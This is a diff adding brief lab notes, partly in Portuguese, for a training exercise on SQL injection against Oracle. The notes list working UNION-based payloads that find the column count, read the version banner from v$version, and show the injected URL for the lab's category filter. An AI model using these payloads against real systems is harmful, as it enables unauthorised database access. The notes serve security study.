@@ -1,0 +1,12 @@
+\\Lab: SQL injection attack, querying the database type and version on Oracle//
+
+Laboratório: https://ac6c1f721e5866cdc0423c0800c0000d.web-security-academy.net
+
+'ORDER BY 2--
+
+
+'UNION SELECT 'a','b' FROM dual--
+
+Buscando versão do banco de dados
+'UNION SELECT banner,'b' FROM v$version--
+ac6c1f721e5866cdc0423c0800c0000d.web-security-academy.net/filter?category='UNION SELECT banner,'b' FROM v$version--
